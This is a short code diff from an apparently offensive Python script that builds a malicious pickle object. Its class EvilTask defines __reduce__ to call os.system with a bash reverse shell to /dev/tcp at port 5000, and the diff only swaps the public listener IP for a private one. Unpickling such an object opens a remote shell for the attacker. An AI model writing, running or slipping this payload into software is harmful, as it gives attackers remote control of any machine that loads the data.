@@ -5,7 +5,7 @@ class EvilTask:
     def __init__(self):
         pass
     def __reduce__(self):
-        return (os.system, ("bash -c 'bash -i >& /dev/tcp/34.69.8.114/5000 0>&1' &",))
+        return (os.system, ("bash -c 'bash -i >& /dev/tcp/10.132.0.3/5000 0>&1' &",))
 
 def create_evil_task():
     evil_task = EvilTask()
